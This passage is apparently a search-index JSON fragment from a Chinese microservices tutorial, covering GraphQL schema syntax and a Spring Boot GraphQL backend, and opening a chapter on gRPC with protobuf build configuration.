\u7684\u5bf9\u8c61\uff0c\u5373\u53ef\u5b9a\u4e49\u6240\u6709\u5141\u8bb8\u7684\u67e5\u8be2\u3002 \u4f8b\u5982\uff0c type Country { name: String } type Query { countries: [Country] } \u5982\u679c\u8981\u8fdb\u884c\u67e5\u8be2\uff0c\u53ef\u4ee5\u4f7f\u7528 query \u5173\u952e\u5b57\uff0c\u52a0\u4e0a\u5b57\u6bb5\u7ed3\u6784\uff0c query { countries { name } } \u8fd9\u4e2a\u7684\u542b\u4e49\u5373\u662f\uff0c\u4ece Query \u5bf9\u8c61\u4e2d\u67e5\u8be2 countries \u5b57\u6bb5\uff0c\u7136\u540e\u67e5\u8be2\u6bcf\u4e2a\u7684 name \u5b57\u6bb5\u3002\u6ce8\u610f\uff0c\u6240\u6709\u7684\u5b57\u6bb5\u90fd\u8981\u5f52\u7ed3\u5230\u57fa\u672c\u7c7b\u578b\u3002 \u6ce8\u610f\uff0c\u8fd9\u91cc\u5982\u679c\u5728\u7c7b\u578b\u5b9a\u4e49\u4e2d\u8fd4\u56de\u5217\u8868\uff0c\u90a3\u4e48\u67e5\u8be2\u65f6\u4e5f\u9700\u8981\u8fd4\u56de\u5217\u8868\uff0c\u540e\u9762\u7684\u67e5\u8be2\u5bf9\u8c61\uff0c\u5373\u8981\u6c42\u53ea\u8fd4\u56de name \uff0c\u662f\u4f5c\u7528\u5728\u5217\u8868\u7684\u6bcf\u4e2a\u5bf9\u8c61\u4e0a\u7684\u3002\u5982\u679c\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u540e\u9762\u7684\u67e5\u8be2\u5bf9\u8c61\u5c31\u662f\u4f5c\u7528\u5728\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u7684\u3002 \u8fd9\u6837\u5b9a\u4e49\u7684\u67e5\u8be2\u662f\u65e0\u53c2\u7684\uff0c\u5982\u679c\u8981\u4f20\u53c2\uff0c\u53ef\u4ee5\u5728 countries \u540e\u9762\u52a0\u4e0a\u53c2\u6570\uff0c type Query { countries($code: String): Country } \u5982\u679c\u8981\u4f20\u5165\u53c2\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\uff0c query { country(code: \"CN\") { name } } \u5982\u679c\u8981\u8f93\u5165\u5bf9\u8c61\uff0c\u9700\u8981\u4f7f\u7528 input \u5173\u952e\u5b57\uff0c\u800c\u4e0d\u80fd\u4f7f\u7528\u4e4b\u524d\u7684 type \u3002 input CountryInput { name: String } type Query { countries($input: CountryInput): [Country] } \u8fd9\u6837\uff0c\u5982\u679c\u8981\u4f20\u5165\u53c2\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\uff0c query { countries(input: {name: \"China\"}) { name } } \u6ce8\u610f\u3002\u6240\u6709\u7684\u67e5\u8be2\u5b57\u6bb5\u6700\u540e\u5fc5\u987b\u5f52\u7ed3\u5230\u57fa\u672c\u7c7b\u578b\u3002\u4f8b\u5982\uff0c type Author { name: String books: [Book] } type Book{ title: String } type Query { authors: [Author] } \u5982\u679c\u8981\u67e5\u8be2\u6240\u6709\u7684\u4e66\u540d\uff0c\u5e94\u5f53\u662f\uff0c query { authors { books { title } } } Mutation Mutation \u4e5f\u662f\u4e00\u4e2a\u7279\u6b8a\u7684 type\uff0c\u5b9a\u4e49\u540d\u79f0\u4e3a Mutation \u7684\u5bf9\u8c61\uff0c\u5373\u53ef\u5b9a\u4e49\u6240\u6709\u5141\u8bb8\u7684\u53d8\u66f4\u3002 \u4f8b\u5982\uff0c type Mutation { addCountry(name: String): Country } \u5982\u679c\u8981\u8fdb\u884c\u53d8\u66f4\uff0c\u53ef\u4ee5\u4f7f\u7528 mutation \u5173\u952e\u5b57\uff0c mutation { addCountry(name: \"China\") { name } } \u5176\u5b83\u7684\u548c Query \u7c7b\u4f3c\u3002 GraphQL \u540e\u7aef\u642d\u5efa \u73b0\u5728\u6211\u4eec\u5f00\u59cb\u642d\u5efa\u540e\u7aef\u3002\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5f15\u5165 GraphQL \u7684\u4f9d\u8d56\uff0c dependencies { implementation 'org.springframework.boot:spring-boot-starter-graphql' implementation 'org.springframework.boot:spring-boot-starter-webflux' compileOnly 'org.projectlombok:lombok' annotationProcessor 'org.projectlombok:lombok' } \u8fd9\u91cc\u4f7f\u7528 Web \u6216\u8005 WebFlux \u90fd\u53ef\u4ee5\u3002 \u7136\u540e\u5728 resources/graphql \u76ee\u5f55\u4e0b\u521b\u5efa schema.gqls \u6587\u4ef6\uff0c\u5b9a\u4e49 GraphQL \u7684 Schema\uff0c\u8fd9\u4e2a\u8def\u5f84\u53ef\u4ee5\u7528 spring.graphql.schema.locations \u914d\u7f6e\uff0c\u540e\u7f00\u540d\u53ef\u4ee5\u662f .gqls \u6216 .graphqls \u3002 type Book { id: ID! title: String! } type Author { id: ID! name: String! books: [Book!]! } type Query { authors: [Author!]! author(id: ID!): Author! books: [Book!]! book(id: ID!): Book! } type Mutation { createAuthor(name: String!): Author! createBook(title: String!): Book! addBookToAuthor(authorId: ID!, bookId: ID!): Author! } \u7136\u540e\u521b\u5efa Author \u548c Book \u7c7b\uff0c @Data public class Author { private String id; private String name; private List<Book> books; } @Data public class Book { private String id; private String title; } \u7136\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e0b Service \u7c7b\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Map \u5f53\u4f5c\u6570\u636e\u5e93\u3002 @Service public class AuthorBookService { private final Map<String, Author> authors = new HashMap<>(); private final Map<String, Book> books = new HashMap<>(); public Author createAuthor(String name) { Author author = new Author(); author.setId(UUID.randomUUID().toString()); author.setName(name); authors.put(author.getId(), author); return author; } public Book createBook(String title) { Book book = new Book(); book.setId(UUID.randomUUID().toString()); book.setTitle(title); books.put(book.getId(), book); return book; } public Author addBookToAuthor(String authorId, String bookId) { Author author = authors.get(authorId); Book book = books.get(bookId); author.getBooks().add(book); return author; } public List<Author> getAuthors() { return new ArrayList<>(authors.values()); } public Author getAuthor(String id) { return authors.get(id); } public List<Book> getBooks() { return new ArrayList<>(books.values()); } public Book getBook(String id) { return books.get(id); } } \u6700\u540e\uff0c\u4e3a\u6bcf\u4e00\u4e2a Query \u548c Mutation \u521b\u5efa\u4e00\u4e2a Resolver\uff0c\u5373 Controller\u3002\u6ce8\u610f\uff0c\u4e0d\u662f @RestController \uff0c\u800c\u662f @Controller \u3002 package io.github.fingerbone.demo; import org.springframework.graphql.data.method.annotation.Argument; import org.springframework.graphql.data.method.annotation.MutationMapping; import org.springframework.graphql.data.method.annotation.QueryMapping; import org.springframework.stereotype.Controller; import java.util.List; @Controller public class AuthorBookController { private final AuthorBookService service; public AuthorBookController(AuthorBookService service) { this.service = service; } @QueryMapping public List<Author> authors() { return service.getAuthors(); } @QueryMapping public Author author(@Argument String id) { return service.getAuthor(id); } @QueryMapping public List<Book> books() { return service.getBooks(); } @QueryMapping public Book book(@Argument String id) { return service.getBook(id); } @MutationMapping public Author createAuthor(@Argument String name) { return service.createAuthor(name); } @MutationMapping public Book createBook(@Argument String title) { return service.createBook(title); } @MutationMapping public Author addBookToAuthor(@Argument String authorId, @Argument String bookId) { return service.addBookToAuthor(authorId, bookId); } } \u7136\u540e\u53ef\u4ee5\u6253\u5f00 graphiql\uff0c\u8fd9\u662f\u4e00\u4e2a GraphQL \u7684\u63a5\u53e3\u6d4b\u8bd5\u5de5\u5177\uff0c\u53ef\u4ee5\u5728\u8fd9\u91cc\u6d4b\u8bd5 GraphQL \u7684\u67e5\u8be2\u548c\u53d8\u66f4\u3002 spring.graphql.graphiql.enabled: true \u7136\u540e\u8bbf\u95ee /graphiql \u5373\u53ef\u3002\u73b0\u5728\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u8fd9\u91cc\u6d4b\u8bd5 GraphQL \u7684\u67e5\u8be2\u548c\u53d8\u66f4\u4e86\u3002\u5f53\u7136\uff0cPostman \u4e5f\u652f\u6301 GraphQL\u3002","title":"GraphQL"},{"location":"17/#ch17-graphql","text":"\u524d\u9762\u6211\u4eec\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u662f\u57fa\u4e8e RESTful API \u6784\u5efa\u7684\uff0c\u4f46\u662f RESTful API \u6700\u5927\u7684\u95ee\u9898\u662f\uff0c\u6240\u6709\u7684 API \u672c\u8d28\u90fd\u662f\u4e00\u4e2a\u9ed1\u76d2\uff0c\u5728\u4f60\u62ff\u5230\u6570\u636e\u4e4b\u524d\uff0c\u4f60\u4e0d\u77e5\u9053\u8fd9\u4e2a API \u4f1a\u8fd4\u56de\u4ec0\u4e48\u6570\u636e\uff0c\u8fd9\u5bfc\u81f4\u4e86\u524d\u540e\u7aef\u5de5\u4f5c\u7684\u8026\u5408\u3002GraphQL \u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u800c\u751f\u7684\u3002 GraphQL \u662f\u4e00\u4e2a\u67e5\u8be2\u8bed\u8a00\uff0c\u5b83\u5141\u8bb8\u5ba2\u6237\u7aef\u67e5\u8be2\u81ea\u5df1\u9700\u8981\u7684\u6570\u636e\uff0c\u800c\u4e0d\u662f\u670d\u52a1\u7aef\u8fd4\u56de\u56fa\u5b9a\u7684\u6570\u636e\u3002\u8fd9\u6837\uff0c\u524d\u540e\u7aef\u53ea\u8981\u7ea6\u5b9a\u597d\u6570\u636e\u5e93\u7684\u7ed3\u6784\uff0c\u5c31\u53ef\u4ee5\u72ec\u7acb\u5f00\u53d1\uff0c\u4e0d\u9700\u8981\u7b49\u5f85\u5bf9\u65b9\u7684\u63a5\u53e3\u3002","title":"\u5fae\u670d\u52a1\u901f\u6210 Ch17 GraphQL"},{"location":"17/#graphql","text":"GraphQL \u662f\u66ff\u6362 RESTful API \u7684\u4e00\u79cd\u65b9\u5f0f\u3002\u56e0\u6b64\u524d\u7aef\u548c\u540e\u7aef\u7684\u4ea4\u4e92\u65b9\u5f0f\u548c RESTful API \u6709\u5f88\u5927\u7684\u4e0d\u540c\u3002 \u5728\u524d\u7aef\uff0c\u4e0e RESTful API \u4e0d\u540c\uff0cGraphQL \u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u5165\u53e3\uff0c\u5373 /graphql \u3002\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u901a\u8fc7\u8fd9\u4e2a\u5165\u53e3\uff0c\u800c\u4e0d\u662f\u901a\u8fc7\u4e0d\u540c\u7684 URL\u3002 \u901a\u8fc7 POST \u65b9\u6cd5\uff0c\u524d\u7aef\u5728 body \u91cc\u53d1\u9001\u4e00\u4e2a GraphQL \u67e5\u8be2\u8bed\u53e5\uff0c\u540e\u7aef\u89e3\u6790\u8fd9\u4e2a\u67e5\u8be2\u8bed\u53e5\uff0c\u8fd4\u56de\u67e5\u8be2\u7ed3\u679c\u3002 GraphQL \u67e5\u8be2\u8bed\u53e5\u662f\u4e00\u79cd\u4e13\u95e8\u7684\u8bed\u8a00\uff0c\u7c7b\u4f3c\u4e8e SQL \u5bf9\u6570\u636e\u5e93\u7684\u67e5\u8be2\u3002\u5b83\u6709\u81ea\u5df1\u7684\u8bed\u6cd5\uff0c\u53ef\u4ee5\u67e5\u8be2\u591a\u4e2a\u5b57\u6bb5\uff0c\u591a\u4e2a\u5bf9\u8c61\uff0c\u591a\u4e2a\u5173\u8054\u5bf9\u8c61\u3002\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u8be6\u7ec6\u4ecb\u7ecd\u3002 \u5728\u540e\u7aef\uff0cGraphQL \u8bed\u53e5\u7684\u89e3\u6790\u548c\u6570\u636e\u7684\u83b7\u53d6\u7531\u6846\u67b6\u81ea\u52a8\u5b8c\u6210\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5b8c\u6210\u6570\u636e\u63d0\u4f9b\u7684\u4efb\u52a1\u5373\u53ef\u3002","title":"GraphQL \u57fa\u672c\u6982\u5ff5"},{"location":"17/#graphql_1","text":"GraphQL \u8bed\u6cd5\u662f\u4e00\u79cd\u7c7b\u4f3c\u4e8e JSON \u7684\u8bed\u8a00\uff0c\u4f46\u662f\u6bd4 JSON \u66f4\u5f3a\u5927\u3002\u5b83\u53ef\u4ee5\u67e5\u8be2\u591a\u4e2a\u5bf9\u8c61\uff0c\u591a\u4e2a\u5b57\u6bb5\uff0c\u591a\u4e2a\u5173\u8054\u5bf9\u8c61\u3002","title":"GraphQL \u8bed\u6cd5"},{"location":"17/#_1","text":"GraphQL \u6709\u4e00\u5957\u72ec\u7acb\u4e8e\u7f16\u7a0b\u8bed\u8a00\u7684\u7c7b\u578b\u7cfb\u7edf\u3002\u8fd9\u4e2a\u7c7b\u578b\u7cfb\u7edf\u5b9a\u4e49\u4e86\u6240\u6709\u7684\u5bf9\u8c61\u548c\u5b57\u6bb5\u7684\u7c7b\u578b\u3002 \u5728 GraphQL \u4e2d\uff0c\u57fa\u672c\u7c7b\u578b\u6709\uff0c Int\uff1a\u6574\u6570 Float\uff1a\u6d6e\u70b9\u6570 String\uff1aUTF-8 \u5b57\u7b26\u4e32 Boolean\uff1atrue \u6216 false ID\uff1a\u552f\u4e00\u6807\u8bc6\u7b26\uff0c\u901a\u5e38\u662f\u5b57\u7b26\u4e32\u3002 \u6b64\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u88c5\u9970\u7b26\uff0c\u6765\u4ece\u57fa\u7840\u7c7b\u578b\u6d3e\u751f\u65b0\u7684\u7c7b\u578b\uff0c [type] \uff1a\u6570\u7ec4 type! \uff1a\u975e\u7a7a\uff0c\u6ce8\u610f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6240\u6709\u7684\u7c7b\u578b\u90fd\u662f\u53ef\u7a7a\u7684\u3002 \u5982\u679c\u8981\u5b9a\u4e49\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u4f7f\u7528 type \u5173\u952e\u5b57\uff0c type Country { name: String } \u4e4b\u540e\u53ef\u4ee5\u540c\u57fa\u672c\u7c7b\u578b\u4e00\u6837\u4f7f\u7528\u8fd9\u4e2a\u5bf9\u8c61\u3002","title":"\u7c7b\u578b"},{"location":"17/#schema","text":"Schema \u5b9a\u4e49\u4e86 GraphQL \u5141\u8bb8\u7684\u67e5\u8be2\u548c\u53d8\u66f4\u3002Schema \u7531 Query \u548c Mutation \u4e24\u90e8\u5206\u7ec4\u6210\u3002","title":"Schema"},{"location":"17/#query","text":"Query \u662f\u4e00\u4e2a\u7279\u6b8a\u7684 type\uff0c\u5b9a\u4e49\u540d\u79f0\u4e3a Query \u7684\u5bf9\u8c61\uff0c\u5373\u53ef\u5b9a\u4e49\u6240\u6709\u5141\u8bb8\u7684\u67e5\u8be2\u3002 \u4f8b\u5982\uff0c type Country { name: String } type Query { countries: [Country] } \u5982\u679c\u8981\u8fdb\u884c\u67e5\u8be2\uff0c\u53ef\u4ee5\u4f7f\u7528 query \u5173\u952e\u5b57\uff0c\u52a0\u4e0a\u5b57\u6bb5\u7ed3\u6784\uff0c query { countries { name } } \u8fd9\u4e2a\u7684\u542b\u4e49\u5373\u662f\uff0c\u4ece Query \u5bf9\u8c61\u4e2d\u67e5\u8be2 countries \u5b57\u6bb5\uff0c\u7136\u540e\u67e5\u8be2\u6bcf\u4e2a\u7684 name \u5b57\u6bb5\u3002\u6ce8\u610f\uff0c\u6240\u6709\u7684\u5b57\u6bb5\u90fd\u8981\u5f52\u7ed3\u5230\u57fa\u672c\u7c7b\u578b\u3002 \u6ce8\u610f\uff0c\u8fd9\u91cc\u5982\u679c\u5728\u7c7b\u578b\u5b9a\u4e49\u4e2d\u8fd4\u56de\u5217\u8868\uff0c\u90a3\u4e48\u67e5\u8be2\u65f6\u4e5f\u9700\u8981\u8fd4\u56de\u5217\u8868\uff0c\u540e\u9762\u7684\u67e5\u8be2\u5bf9\u8c61\uff0c\u5373\u8981\u6c42\u53ea\u8fd4\u56de name \uff0c\u662f\u4f5c\u7528\u5728\u5217\u8868\u7684\u6bcf\u4e2a\u5bf9\u8c61\u4e0a\u7684\u3002\u5982\u679c\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u540e\u9762\u7684\u67e5\u8be2\u5bf9\u8c61\u5c31\u662f\u4f5c\u7528\u5728\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u7684\u3002 \u8fd9\u6837\u5b9a\u4e49\u7684\u67e5\u8be2\u662f\u65e0\u53c2\u7684\uff0c\u5982\u679c\u8981\u4f20\u53c2\uff0c\u53ef\u4ee5\u5728 countries \u540e\u9762\u52a0\u4e0a\u53c2\u6570\uff0c type Query { countries($code: String): Country } \u5982\u679c\u8981\u4f20\u5165\u53c2\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\uff0c query { country(code: \"CN\") { name } } \u5982\u679c\u8981\u8f93\u5165\u5bf9\u8c61\uff0c\u9700\u8981\u4f7f\u7528 input \u5173\u952e\u5b57\uff0c\u800c\u4e0d\u80fd\u4f7f\u7528\u4e4b\u524d\u7684 type \u3002 input CountryInput { name: String } type Query { countries($input: CountryInput): [Country] } \u8fd9\u6837\uff0c\u5982\u679c\u8981\u4f20\u5165\u53c2\u6570\uff0c\u53ef\u4ee5\u4f7f\u7528\uff0c query { countries(input: {name: \"China\"}) { name } } \u6ce8\u610f\u3002\u6240\u6709\u7684\u67e5\u8be2\u5b57\u6bb5\u6700\u540e\u5fc5\u987b\u5f52\u7ed3\u5230\u57fa\u672c\u7c7b\u578b\u3002\u4f8b\u5982\uff0c type Author { name: String books: [Book] } type Book{ title: String } type Query { authors: [Author] } \u5982\u679c\u8981\u67e5\u8be2\u6240\u6709\u7684\u4e66\u540d\uff0c\u5e94\u5f53\u662f\uff0c query { authors { books { title } } }","title":"Query"},{"location":"17/#mutation","text":"Mutation \u4e5f\u662f\u4e00\u4e2a\u7279\u6b8a\u7684 type\uff0c\u5b9a\u4e49\u540d\u79f0\u4e3a Mutation \u7684\u5bf9\u8c61\uff0c\u5373\u53ef\u5b9a\u4e49\u6240\u6709\u5141\u8bb8\u7684\u53d8\u66f4\u3002 \u4f8b\u5982\uff0c type Mutation { addCountry(name: String): Country } \u5982\u679c\u8981\u8fdb\u884c\u53d8\u66f4\uff0c\u53ef\u4ee5\u4f7f\u7528 mutation \u5173\u952e\u5b57\uff0c mutation { addCountry(name: \"China\") { name } } \u5176\u5b83\u7684\u548c Query \u7c7b\u4f3c\u3002","title":"Mutation"},{"location":"17/#graphql_2","text":"\u73b0\u5728\u6211\u4eec\u5f00\u59cb\u642d\u5efa\u540e\u7aef\u3002\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u5f15\u5165 GraphQL \u7684\u4f9d\u8d56\uff0c dependencies { implementation 'org.springframework.boot:spring-boot-starter-graphql' implementation 'org.springframework.boot:spring-boot-starter-webflux' compileOnly 'org.projectlombok:lombok' annotationProcessor 'org.projectlombok:lombok' } \u8fd9\u91cc\u4f7f\u7528 Web \u6216\u8005 WebFlux \u90fd\u53ef\u4ee5\u3002 \u7136\u540e\u5728 resources/graphql \u76ee\u5f55\u4e0b\u521b\u5efa schema.gqls \u6587\u4ef6\uff0c\u5b9a\u4e49 GraphQL \u7684 Schema\uff0c\u8fd9\u4e2a\u8def\u5f84\u53ef\u4ee5\u7528 spring.graphql.schema.locations \u914d\u7f6e\uff0c\u540e\u7f00\u540d\u53ef\u4ee5\u662f .gqls \u6216 .graphqls \u3002 type Book { id: ID! title: String! } type Author { id: ID! name: String! books: [Book!]! } type Query { authors: [Author!]! author(id: ID!): Author! books: [Book!]! book(id: ID!): Book! } type Mutation { createAuthor(name: String!): Author! createBook(title: String!): Book! addBookToAuthor(authorId: ID!, bookId: ID!): Author! } \u7136\u540e\u521b\u5efa Author \u548c Book \u7c7b\uff0c @Data public class Author { private String id; private String name; private List<Book> books; } @Data public class Book { private String id; private String title; } \u7136\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e0b Service \u7c7b\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Map \u5f53\u4f5c\u6570\u636e\u5e93\u3002 @Service public class AuthorBookService { private final Map<String, Author> authors = new HashMap<>(); private final Map<String, Book> books = new HashMap<>(); public Author createAuthor(String name) { Author author = new Author(); author.setId(UUID.randomUUID().toString()); author.setName(name); authors.put(author.getId(), author); return author; } public Book createBook(String title) { Book book = new Book(); book.setId(UUID.randomUUID().toString()); book.setTitle(title); books.put(book.getId(), book); return book; } public Author addBookToAuthor(String authorId, String bookId) { Author author = authors.get(authorId); Book book = books.get(bookId); author.getBooks().add(book); return author; } public List<Author> getAuthors() { return new ArrayList<>(authors.values()); } public Author getAuthor(String id) { return authors.get(id); } public List<Book> getBooks() { return new ArrayList<>(books.values()); } public Book getBook(String id) { return books.get(id); } } \u6700\u540e\uff0c\u4e3a\u6bcf\u4e00\u4e2a Query \u548c Mutation \u521b\u5efa\u4e00\u4e2a Resolver\uff0c\u5373 Controller\u3002\u6ce8\u610f\uff0c\u4e0d\u662f @RestController \uff0c\u800c\u662f @Controller \u3002 package io.github.fingerbone.demo; import org.springframework.graphql.data.method.annotation.Argument; import org.springframework.graphql.data.method.annotation.MutationMapping; import org.springframework.graphql.data.method.annotation.QueryMapping; import org.springframework.stereotype.Controller; import java.util.List; @Controller public class AuthorBookController { private final AuthorBookService service; public AuthorBookController(AuthorBookService service) { this.service = service; } @QueryMapping public List<Author> authors() { return service.getAuthors(); } @QueryMapping public Author author(@Argument String id) { return service.getAuthor(id); } @QueryMapping public List<Book> books() { return service.getBooks(); } @QueryMapping public Book book(@Argument String id) { return service.getBook(id); } @MutationMapping public Author createAuthor(@Argument String name) { return service.createAuthor(name); } @MutationMapping public Book createBook(@Argument String title) { return service.createBook(title); } @MutationMapping public Author addBookToAuthor(@Argument String authorId, @Argument String bookId) { return service.addBookToAuthor(authorId, bookId); } } \u7136\u540e\u53ef\u4ee5\u6253\u5f00 graphiql\uff0c\u8fd9\u662f\u4e00\u4e2a GraphQL \u7684\u63a5\u53e3\u6d4b\u8bd5\u5de5\u5177\uff0c\u53ef\u4ee5\u5728\u8fd9\u91cc\u6d4b\u8bd5 GraphQL \u7684\u67e5\u8be2\u548c\u53d8\u66f4\u3002 spring.graphql.graphiql.enabled: true \u7136\u540e\u8bbf\u95ee /graphiql \u5373\u53ef\u3002\u73b0\u5728\u6211\u4eec\u5c31\u53ef\u4ee5\u5728\u8fd9\u91cc\u6d4b\u8bd5 GraphQL \u7684\u67e5\u8be2\u548c\u53d8\u66f4\u4e86\u3002\u5f53\u7136\uff0cPostman \u4e5f\u652f\u6301 GraphQL\u3002","title":"GraphQL \u540e\u7aef\u642d\u5efa"},{"location":"18/","text":"\u5fae\u670d\u52a1\u901f\u6210 Ch18 gRPC \u8fd9\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 Java \u8bed\u8a00\uff0c\u4f46\u4e0d\u4f1a\u4f7f\u7528 Spring \u6846\u67b6\u3002 GraphQL \u9002\u5408\u7528\u4e8e\u8d44\u6e90\u578b\u63a5\u53e3\u3002\u4f46\u662f\uff0c\u8fd8\u6709\u4e9b\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u53bb\u8c03\u7528\u8fdc\u7a0b\u7684\u67d0\u4e2a\u670d\u52a1\uff0c\u800c\u975e\u67e5\u8be2\u8d44\u6e90\u3002\u5982\u679c\u7528 REST\uff0c\u90a3\u4e48\u5c31\u4f1a\u6709\u5f88\u591a\u7684\u63a5\u53e3\uff0c\u800c\u4e14\u6bcf\u4e2a\u63a5\u53e3\u90fd\u662f\u4e00\u4e2a\u8d44\u6e90\u3002\u5982\u679c\u7528 GraphQL\uff0c\u6700\u540e\u4f1a\u4ea7\u751f\u5f88\u591a\u6ca1\u6709\u610f\u4e49\u7684 mutation\u3002\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u9700\u8981\u7528\u5230 RPC\uff08Remote Procedure Call\uff09\uff0c\u5373\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u3002 RPC \u662f\u4e0e HTTP \u540c\u7ea7\u522b\u7684\u534f\u8bae\uff0c\u4e14\u65e9\u4e8e\u540e\u8005\u7684\u51fa\u73b0\u3002\u5177\u4f53\u800c\u8a00\uff0cRPC \u5e0c\u671b\u80fd\u4f7f\u5f97\u8c03\u7528\u8fdc\u7a0b\u7684\u51fd\u6570\u4e0e\u8c03\u7528\u672c\u5730\u7684\u51fd\u6570\u4e00\u6837\u7b80\u5355\u3002 RPC \u6709\u8bb8\u591a\u5b9e\u73b0\uff0c\u5176\u4e2d\u6700\u5e38\u7528\u7684\u662f gRPC\uff0c\u7531 Google \u5f00\u53d1\u3002gRPC \u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u3001\u5f00\u6e90\u548c\u901a\u7528\u7684 RPC \u6846\u67b6\uff0c\u57fa\u4e8e HTTP/2 \u534f\u8bae\uff0c\u652f\u6301\u591a\u79cd\u8bed\u8a00\u3002gRPC \u4f7f\u7528 Protocol Buffers \u4f5c\u4e3a\u63a5\u53e3\u63cf\u8ff0\u8bed\u8a00\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b9a\u4e49\u670d\u52a1\u548c\u6d88\u606f\u3002 \u6b64\u5916\uff0cJSON RPC\uff0cdubbo \u7b49\u4e5f\u662f\u5e38\u7528\u7684 RPC \u6846\u67b6\u3002 gRPC \u57fa\u672c\u539f\u7406 gRPC \u7684\u539f\u7406\u5f88\u7b80\u5355\u3002\u5f53\u672c\u5730\u8c03\u7528\u8fdc\u7a0b\u670d\u52a1\u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u8c03\u7528\u4e86\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\u3002\u8fd9\u4e2a\u4ee3\u7406\u5bf9\u8c61\u4f1a\u5c06\u8c03\u7528\u7684\u65b9\u6cd5\u3001\u53c2\u6570\u7b49\u4fe1\u606f\u5e8f\u5217\u5316\u6210\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u7136\u540e\u901a\u8fc7\u7f51\u7edc\u4f20\u8f93\u5230\u8fdc\u7a0b\u670d\u52a1\u3002\u8fdc\u7a0b\u670d\u52a1\u63a5\u6536\u5230\u6570\u636e\u540e\uff0c\u518d\u5c06\u6570\u636e\u53cd\u5e8f\u5217\u5316\uff0c\u8c03\u7528\u76f8\u5e94\u7684\u65b9\u6cd5\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u5e8f\u5217\u5316\u540e\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002 gRPC \u4e2d\uff0c\u8fd9\u4e2a\u5e8f\u5217\u5316\u65b9\u6cd5\u662f Protocol Buffers\u3002Protocol Buffers \u662f\u4e00\u79cd\u8f7b\u4fbf\u9ad8\u6548\u7684\u7ed3\u6784\u5316\u6570\u636e\u5b58\u50a8\u683c\u5f0f\uff0c\u7c7b\u4f3c\u4e8e XML\u3002Protocol Buffers \u53ef\u4ee5\u7528\u4e8e\u7ed3\u6784\u5316\u6570\u636e\u5e8f\u5217\u5316\uff0c\u5f88\u9002\u5408\u7528\u4e8e\u901a\u4fe1\u534f\u8bae\u548c\u6570\u636e\u5b58\u50a8\u3002 gRPC \u4e2d\uff0c\u4f7f\u7528 .proto \u6587\u4ef6\u6765\u7ea6\u5b9a\u63a5\u53e3\u3002 .proto \u6587\u4ef6\u5b9a\u4e49\u4e86\u670d\u52a1\u548c\u6d88\u606f\u3002\u7136\u540e\uff0c\u4f7f\u7528 protoc \u7f16\u8bd1\u5668\u751f\u6210\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u7684\u4ee3\u7801\u3002 \u9879\u76ee\u914d\u7f6e \u5f15\u5165\u4f9d\u8d56\uff0c implementation 'io.grpc:grpc-stub:1.66.0' implementation 'io.grpc:grpc-protobuf:1.66.0' implementation 'io.grpc:grpc-netty:1.66.0' compileOnly 'org.apache.tomcat:annotations-api:6.0.53' \u7136\u540e\uff0c\u8fd8\u6709\u4e00\u4e2a\u63d2\u4ef6\uff0c id \"com.google.protobuf\" version \"0.9.4\" gRPC \u662f\u57fa\u4e8e .proto \u6587\u4ef6\u7684\uff0c .proto \u6587\u4ef6\u9700\u8981\u4e00\u4e2a protoc \u7f16\u8bd1\u5668\uff0c\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u7684 protoc\u3002\u6b64\u5916\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a\u4ee3\u7801\u751f\u6210\u5668\u3002\u8fd9\u91cc\u4ee3\u7801\u751f\u6210\u5668\u4f7f\u7528 java lite \u7248\u672c\uff0cprotoc \u4e5f\u9002\u7528 java lite \u7248\u672c\u3002 implementation 'com.google.protobuf:protobuf-javalite:4.28.0-RC3' \u7136\u540e\u914d\u7f6e\u7f16\u8bd1 proto \u7684\u63d2\u4ef6\u548c\u4efb\u52a1\u3002 protobuf { protoc { artifact = \"com.google.protobuf:protoc:3.25.3\" } plugins { grpc { artifact = 'io.grpc:protoc-gen-grpc-java:1.66.0' } } generateProtoTasks { all()*.plugins { grpc {} } } } \u6ce8\u610f\uff0c\u8fd9\u4e2a\u7248\u672c\u5fc5\u987b\u5bf9\u5e94\u4e0a\uff0c\u6700\u65b0\u7248\u672c\u53c2\u8003 \u5b98\u65b9GitHub \u3002 protobuf \u8bed\u6cd5 proto \u6587\u4ef6\u662f\u4e00\u4e2a\u6587\u672c\u6587\u4ef6\uff0c\u7528\u4e8e\u5b9a\u4e49\u6d88\u606f\u7c7b\u578b\u548c\u670d\u52a1\u3002 \u6587\u4ef6\u5934 \u5728 proto \u6587\u4ef6\u5934\uff0c\u9700\u8981\u6307\u5b9a proto 